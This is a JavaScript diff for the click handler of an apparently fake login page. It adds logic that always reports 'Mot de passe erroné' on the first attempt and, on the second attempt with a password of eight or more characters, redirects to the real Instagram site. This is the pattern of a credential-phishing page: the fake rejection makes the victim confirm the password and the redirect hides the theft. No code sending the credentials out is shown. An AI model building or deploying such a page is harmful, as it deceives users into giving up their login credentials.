@@ -35,20 +35,24 @@ document.getElementById('login-btn').addEventListener('click', async function ()
 
     tentatives++;
 
-    if (tentatives === 1) {
-        // Première tentative : toujours erreur
-        usernameBloc.classList.add('bloc-error');
-        passwordBloc.classList.add('bloc-error');
-        errorMsg.textContent = "Mot de passe erroné";
-        errorMsg.style.display = 'block';
-        return;
-    }
+if (tentatives === 1) {
+    usernameBloc.classList.add('bloc-error');
+    passwordBloc.classList.add('bloc-error');
+    errorMsg.textContent = "Mot de passe erroné";
+    errorMsg.style.display = 'block';
+    return;
+}
 
-    // Deuxième tentative : laisse passer
+if (tentatives >= 2 && passwordInput.value.length >= 8) {
     errorMsg.style.display = 'none';
     usernameBloc.classList.remove('bloc-error');
     passwordBloc.classList.remove('bloc-error');
-    // Redirige ou fait ce que tu veux ici
+    window.location.href = "https://www.instagram.com";
+    return;
+}
+
+errorMsg.textContent = "Mot de passe erroné";
+errorMsg.style.display = 'block';
 });
 document.getElementById('toggle-password').addEventListener('click', function() {
     const pwd = document.getElementById('password');
